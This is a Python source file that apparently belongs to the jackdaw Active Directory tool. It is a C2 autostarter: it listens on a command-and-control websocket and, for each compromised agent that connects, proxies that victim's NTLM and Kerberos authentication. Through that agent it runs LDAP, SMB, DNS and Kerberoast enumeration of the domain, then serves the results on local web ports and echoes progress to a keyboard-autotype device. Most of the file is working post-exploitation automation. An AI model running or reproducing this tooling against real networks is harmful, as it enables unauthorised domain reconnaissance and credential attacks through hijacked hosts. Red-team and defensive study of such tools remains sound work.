
import asyncio
import os
import traceback
from urllib.parse import urlparse, parse_qs
import multiprocessing
import pathlib
import datetime
import json
import aiohttp

from jackdaw.dbmodel import create_db, get_session
from jackdaw.gatherer.gatherer import Gatherer
from jackdaw.nest.wrapper import NestServer
from jackdaw.nest.ws.server import NestWebSocketServer
from jackdaw.aclpwn import ACLPwn
from jackdaw.gatherer.progress import *

import websockets
from pyodidewsnet.protocol import OPCMD, CMD, WSNOK, CMDType, WSNSocketData, WSNConnect
import multiprocessing

class WebServerProcess(multiprocessing.Process):
	def __init__(self, db_conn, bind_ip, bind_port, work_dir, graph_backend = 'igraph'):
		multiprocessing.Process.__init__(self)
		self.db_conn = db_conn
		self.bind_ip = bind_ip
		self.bind_port = bind_port
		self.work_dir = work_dir
		self.graph_backend = graph_backend
		self.server = None

	def run(self):
		self.server = NestServer(
				self.db_conn, 
				bind_ip = self.bind_ip, 
				bind_port = self.bind_port,
				debug = False,
				work_dir = self.work_dir,
				graph_backend = self.graph_backend,
			)
		print('runnin server!')
		self.server.run()

DUCKY_EVENT_LOOKUP = {
	'CONNECTED'      : [
		'STRING Connected to the C2 server!',
		'DELAY 100',
		'ENTER',
	],
	'AGENTCONNECTED' : [
		'STRING Agent connected!',
		'DELAY 100',
		'ENTER',
	],
	'JDENUMSTART'    : [
		'STRING Starting domain enumeration',
		'DELAY 100',
		'ENTER',
	],
	'JDENUMFINISH'   : [
		'STRING Domain enumeration finished!',
		'DELAY 100',
		'ENTER',
	],
	'JDSERVICESTART' : [
		'STRING JD service',
		'DELAY 100',
		'ENTER',
	]
}

class C2AutoStart:
	def __init__(self, c2url, workdir = None, duckysvc = None, duckyevent = DUCKY_EVENT_LOOKUP, graph_backend = 'igraph'):
		self.c2url = c2url
		self.workdir = workdir
		self.duckysvc_url = duckysvc
		self.duckysvc_event = duckyevent
		self.graph_backend = graph_backend
		self.ws = None
		self.c2_ip = None
		self.c2_port = None
		self.c2_proto = None

		self.web_start_port = 5000
		self.duck_task = None
		self.ducky_q = None

	def get_web_port(self):
		t = self.web_start_port
		self.web_start_port += 1
		return t

	async def setup(self):
		if self.duckysvc_event is None:
			self.duckysvc_event = DUCKY_EVENT_LOOKUP
		elif isinstance(self.duckysvc_event, str):
			with open(self.duckysvc_event, 'r') as f:
				self.duckysvc_event = json.load(f)
		self.ducky_q = asyncio.Queue()
		self.duck_task = asyncio.create_task(self.__ducky_send())

		if self.workdir is None:
			self.workdir = str(pathlib.Path.cwd())
		o = urlparse(self.c2url)
		self.c2_proto = o.scheme
		self.c2_ip = o.hostname
		self.c2_port = o.port
		if self.c2_port is None:
			if self.c2_proto == 'ws':
				self.c2_port = 80
			else:
				self.c2_port == 443

	async def __ducky_send(self):
		if self.duckysvc_url is None:
			while True:
				try:
					await self.ducky_q.get()
				except:
					return

		else:
			while True:
				async with websockets.connect(self.duckysvc_url) as websocket:
					while True:
						try:
							data = await self.ducky_q.get()
							#delay is buggy so we are emulating it
							res = ''
							for entry in data:
								if entry.upper().startswith('DELAY '):
									if len(res) > 0:
										await websocket.send(res)
										res = ''
									t = int(entry[6:].strip())
									await asyncio.sleep(t/1000)
								else:
									res += entry + '\r\n'
								
								await websocket.send(res)
								res = ''
							
						except:
							break
				await asyncio.sleep(5)


	async def print_progress(self, agent_id, progress_q):
		agent_id = agent_id[:8]
		basic_pos = 0
		sd_pos = 0
		sdcalc_pos = 0
		smb_pos = 0
		dns_pos = 0
		kerb_pos = 0
		member_pos = 0
		while True:
			try:
				msg = await progress_q.get()
				
				if msg is None:
					return
			
				if msg.type == GathererProgressType.BASIC:
					if msg.msg_type == MSGTYPE.PROGRESS:
						basic_pos += msg.step_size
						print('%s LDAP BASIC enum progress. Items : %s' % (agent_id[:8], basic_pos))
						await self.ducky_q.put(
							[
								'STRING %s LDAP BASIC enum progress. Items: %s' % (agent_id[:8], basic_pos),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

						#if ldap_basic_pbar.total is None:
						#	ldap_basic_pbar.total = msg.total
						#
						#ldap_basic_pbar.update(msg.step_size)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s LDAP BASIC enum finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s LDAP BASIC enum finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.SD:
					if msg.msg_type == MSGTYPE.PROGRESS:
						sd_pos += msg.step_size
						p = (sd_pos / msg.total) * 100
						print('%s LDAP SD enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, sd_pos, p))
						await self.ducky_q.put(
							[
								'STRING %s LDAP SD enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, sd_pos, p),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

						#if ldap_sd_pbar.total is None:
						#	ldap_sd_pbar.total = msg.total
						#
						#ldap_sd_pbar.update(msg.step_size)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s LDAP SD enum finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s LDAP SD enum finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.SDUPLOAD:
					if msg.msg_type == MSGTYPE.PROGRESS:
						print('%s LDAP SD upload progress' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s LDAP SD upload progress' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s LDAP SD upload finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s LDAP SD upload finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.MEMBERS:
					if msg.msg_type == MSGTYPE.PROGRESS:
						member_pos += msg.step_size
						p = (member_pos / msg.total) * 100
						print('%s LDAP MEMBER enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, member_pos, p))
						await self.ducky_q.put(
							[
								'STRING %s LDAP MEMBER enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, member_pos, p),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s LDAP MEMBER enum finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s LDAP MEMBER enum finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)
				
				elif msg.type == GathererProgressType.MEMBERSUPLOAD:
					if msg.msg_type == MSGTYPE.PROGRESS:
						print('%s LDAP MEMBER upload progress' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s LDAP MEMBER upload progress' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s LDAP MEMBER upload finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s LDAP MEMBER upload finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.KERBEROAST:
					if msg.msg_type == MSGTYPE.PROGRESS:
						kerb_pos += msg.step_size
						p = (kerb_pos / msg.total) * 100
						print('%s KERBEROAST progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, kerb_pos, p))
						await self.ducky_q.put(
							[
								'STRING %s KERBEROAST progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, kerb_pos, p),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s KERBEROAST finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s KERBEROAST finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.DNS:
					if msg.msg_type == MSGTYPE.PROGRESS:
						dns_pos += msg.step_size
						p = (dns_pos / msg.total) * 100
						print('%s DNS enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, dns_pos, p))
						await self.ducky_q.put(
							[
								'STRING %s DNS enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, dns_pos, p),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s DNS enum finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s DNS enum finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)
				
				elif msg.type == GathererProgressType.SMB:
					if msg.msg_type == MSGTYPE.PROGRESS:
						smb_pos += msg.step_size
						p = (smb_pos / msg.total) * 100
						print('%s SMB enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, smb_pos, p))
						await self.ducky_q.put(
							[
								'STRING %s SMB enum progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, smb_pos, p),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s SMB enum finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s SMB enum finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.SDCALC:
					if msg.msg_type == MSGTYPE.PROGRESS:
						sdcalc_pos += msg.step_size
						p = (sdcalc_pos / msg.total) * 100
						print('%s SDCALC progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, sdcalc_pos, p))
						await self.ducky_q.put(
							[
								'STRING %s SDCALC progress. Total: %s Items: %s Status: %s' % (agent_id[:8], msg.total, sdcalc_pos, p),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s SDCALC finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s SDCALC finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.SDCALCUPLOAD:
					if msg.msg_type == MSGTYPE.STARTED:
						print('%s SDUPLOAD started' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s SDUPLOAD started' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)					

					if msg.msg_type == MSGTYPE.FINISHED:
						print('%s SDUPLOAD finished' % agent_id[:8])
						await self.ducky_q.put(
							[
								'STRING %s SDUPLOAD finished' % agent_id[:8],
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				elif msg.type == GathererProgressType.INFO:
					print('%s INFO: %s' % (agent_id[:8], msg.text))
					await self.ducky_q.put(
							[
								'STRING %s INFO: %s' % (agent_id[:8], msg.text),
								'DELAY 1000',
								'ENTER',
								'DELAY 1000'
							]
						)

				#elif msg.type == GathererProgressType.REFRESH:
				#	a = 1

			except asyncio.CancelledError:
				return
			except Exception as e:
				print('Progress display function crashed Reason: %s' % e)
				await self.ducky_q.put(
					[
						'STRING %s Progress display function crashed Reason: %s' % (agent_id[:8], str(e)),
						'DELAY 1000',
						'ENTER',
						'DELAY 1000'
					]
				)
				return
		

	async def __start_cmd(self, cmd):
		try:
			print('New agent connected to C2! Starting jackdaw...')
			print(cmd.to_dict())
			progress_q = asyncio.Queue()
			progress_task = asyncio.create_task(self.print_progress(cmd.agentid.hex(), progress_q))

			await self.ducky_q.put(self.duckysvc_event['AGENTCONNECTED'])

			wsproto = 'wsnetws' if self.c2_proto == 'ws' else 'wsnetwss'
			domain = cmd.domain
			username = cmd.username
			if username.find('\\') != -1:
				domain, username = username.split('\\')
			
			dns_url = 'dns://%s:53/?proxytype=%s&proxyhost=%s&proxyport=%s&proxyagentid=%s' % (cmd.logonserver, wsproto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			kerberos_url = '%s://%s:%s/?type=sspiproxy&agentid=%s' % (self.c2_proto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			params = 'authhost=%s&authport=%s&authagentid=%s&proxytype=%s&proxyhost=%s&proxyport=%s&proxyagentid=%s' % ( self.c2_ip, self.c2_port, cmd.agentid.hex(), wsproto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			smb_url = 'smb2+sspiproxy-ntlm://%s\\%s:aa@%s/?%s' % (domain, username, cmd.logonserver, params)
			ldap_url = 'ldap+sspiproxy-ntlm://%s\\%s:aa@%s/?%s' % (domain, username, cmd.logonserver, params)

			print('dns %s' % dns_url)
			print('kerberos %s' % kerberos_url)
			print('smb %s' % smb_url)
			print('ldap %s' % ldap_url)

			smb_workers = 10
			ldap_workers = 4
			
			loc_base = '%s_%s' % (datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"), cmd.agentid.hex()[:8])
			p = pathlib.Path(self.workdir).joinpath('./workdir_' + loc_base)
			p.mkdir(parents=True, exist_ok=True)
			db_loc = '%s_%s.db' % (cmd.domain, loc_base)
			db_loc = p.joinpath(db_loc)
			print(db_loc)
			db_conn = 'sqlite:///%s' % db_loc
			create_db(db_conn)

			
			
			work_dir = str(p)

			print(work_dir)
			print(db_conn)
			
			await self.ducky_q.put(self.duckysvc_event['JDENUMSTART'])

			with multiprocessing.Pool() as mp_pool:
				gatherer = Gatherer(
					db_conn, 
					work_dir, 
					ldap_url, 
					smb_url,
					kerb_url=kerberos_url,
					ldap_worker_cnt=ldap_workers, 
					smb_worker_cnt=smb_workers, 
					mp_pool=mp_pool, 
					smb_gather_types=['all'],
					progress_queue=progress_q, 
					show_progress=False,
					calc_edges=True,
					ad_id=None,
					dns=dns_url,
					no_work_dir=False
				)
				_, err = await gatherer.run()
				if err is not None:
					raise err
			
			print('%s Jackdaw finished sucsessfully!' % cmd.agentid.hex()[:8])

			progress_task.cancel()

			await self.ducky_q.put(self.duckysvc_event['JDENUMFINISH'])

			web_port = self.get_web_port()
			ws_port = self.get_web_port()
			print('%s Starting webserver on port %s' % (cmd.agentid.hex()[:8], web_port))
			websrv = WebServerProcess(db_conn, '0.0.0.0', web_port, work_dir, graph_backend = self.graph_backend)
			websrv.start()

			#checking if server is up now...
			own_ip = None
			while True:
				try:
					_, writer = await asyncio.open_connection('127.0.0.1', web_port)
					own_ip = writer.get_extra_info('sockname')[0]
				except:
					print('%s Could not connect to webserver, probably not ready yet' % cmd.agentid.hex()[:8])
					await asyncio.sleep(1)
				else:
					print('%s Jackdaw server started!' % cmd.agentid.hex()[:8])
					writer.close()
					break
			
			jd_url = 'http://%s:%s' % (own_ip, web_port)
			try:
				print('%s Asking server to load graph data to memory...' % cmd.agentid.hex()[:8])
				async with aiohttp.ClientSession() as session:
					async with session.post('%s/graph?adids=1' % jd_url) as resp:
						if resp.status != 200:
							raise Exception('Loading graphid failed! Status: %s' % resp.status)
						await resp.text()
			except Exception as e:
				raise e

			
			
			print('%s WEB Service listening on port %s' % (cmd.agentid.hex()[:8], ws_port))
			await self.ducky_q.put(self.duckysvc_event['JDSERVICESTART'])
			await self.ducky_q.put(
				[
					'STRING %s WEB listening on port %s' % (cmd.agentid.hex()[:8], ws_port),
					'DELAY 1000',
					'ENTER'
				]
			)

			server = NestWebSocketServer('127.0.0.1', ws_port, db_conn, work_dir, 'igraph', ssl_ctx = None)
			ws_task = asyncio.create_task(server.run())
			await asyncio.sleep(0)

			while True:
				try:
					_, writer = await asyncio.open_connection('127.0.0.1', ws_port)
					own_ip = writer.get_extra_info('sockname')[0]
				except:
					print('%s Could not connect to ws server, probably not ready yet' % cmd.agentid.hex()[:8])
					await asyncio.sleep(1)
				else:
					print('%s Jackdaw WS server started!' % cmd.agentid.hex()[:8])
					writer.close()
					break

			print('%s WS Service listening on port %s' % (cmd.agentid.hex()[:8], ws_port))
			await self.ducky_q.put(
				[
					'STRING %s WS Service listening on port %s' % (cmd.agentid.hex()[:8], ws_port),
					'DELAY 1000',
					'ENTER'
				]
			)


			await asyncio.sleep(1000)

		except Exception as e:
			print('%s Exception handling agent Reson: %s' % (cmd.agentid.hex()[:8], e))
			await self.ducky_q.put(
				[
					'STRING %s Exception handling agent Reson: %s' % (cmd.agentid.hex()[:8], e),
					'DELAY 1000',
					'ENTER'
				]
			)

	async def run(self):
		try:
			first= True
			await self.setup()
			while True:
				if first is False:
					await asyncio.sleep(5)
				first = False
				print('Connecting to C2 server')
				try:
					self.ws = await websockets.connect(self.c2url)
				except Exception as e:
					print('Failed to connect to server!')
					continue
				
				print('Connected to the C2 server!')

				await self.ducky_q.put(self.duckysvc_event['CONNECTED'])
				while True:
					try:
						data = await self.ws.recv()
						cmd = CMD.from_bytes(data)
						if cmd.type == CMDType.AGENTINFO:
							asyncio.create_task(self.__start_cmd(cmd))
						
					except Exception as e:
						print('run exception!')
						print(e)
						break
				
		except Exception as e:
			print(e)


async def amain(url, workdir, duckysvc = None, duckyevent = None):
	auto = C2AutoStart(url, workdir, duckysvc = duckysvc, duckyevent=duckyevent)
	await auto.run()


def main():
	import argparse
	import platform
	import logging
	
	parser = argparse.ArgumentParser(description='Jackdaw autostarter for wsnetws C2 server')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('-w', '--workdir', help = 'Work data directory to store all results')
	parser.add_argument('-d', '--duckysvc', help = 'DuckySvc URL for keyboard autotype')
	parser.add_argument('-e', '--duckyevent', help = 'Event file for the keyboard autotype')
	parser.add_argument('url', help = 'url')
	
	args = parser.parse_args()

	asyncio.run(amain(args.url, args.workdir, args.duckysvc, args.duckyevent))

if __name__ == '__main__':
	main()